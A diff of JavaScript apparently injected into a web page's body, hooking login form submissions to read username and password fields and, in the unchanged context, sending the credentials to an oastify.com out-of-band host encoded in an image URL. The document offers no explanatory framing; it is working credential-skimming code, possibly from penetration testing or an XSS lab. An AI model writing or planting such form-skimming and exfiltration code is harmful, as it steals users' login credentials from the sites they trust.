@@ -21,18 +21,30 @@
                 xhr.open('GET', 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com/USER' + encodeURIComponent(username) + 'PASS' + encodeURIComponent(password) + '.png', true);
                 xhr.send();
             }
+
+            document.body.addEventListener('submit', function(event) {
+                if (event.target.tagName.toLowerCase() === 'form') {
+                    var username = event.target.querySelector('#control').value;
+                    var password = event.target.querySelector('#control').value;
+                    alert(username+password);
+                    console.log(username+password);
+                    
+                    event.preventDefault();
+                    setTimeout(() => { event.target.submit(); }, 1000);
+                }
+            });
+
+            
             var formxyz = document.getElementsByTagName('form')[0]; // Adjust selector as needed
-            formxyz.addEventListener('submit', function(event) {
-                var username = document.getElementById('control').value; // Assumes there is an element with ID 'username'
-                var password = document.getElementById('control').value; // Assumes there is an element with ID 'password'
-                //sendData(username, password);
+            formxyz.onsubmit = function(event) {
+                var username = document.getElementById('control').value;
+                var password = document.getElementById('control').value;
                 alert(username+password);
                 console.log(username+password);
                 
-                // Prevent immediate form submission
                 event.preventDefault();
-                setTimeout(function() { formxyz.submit(); }, 2000);
-            });
+                setTimeout(() => { formxyz.submit(); }, 1000);
+            };
         `;
         doc.body.appendChild(script);
     };
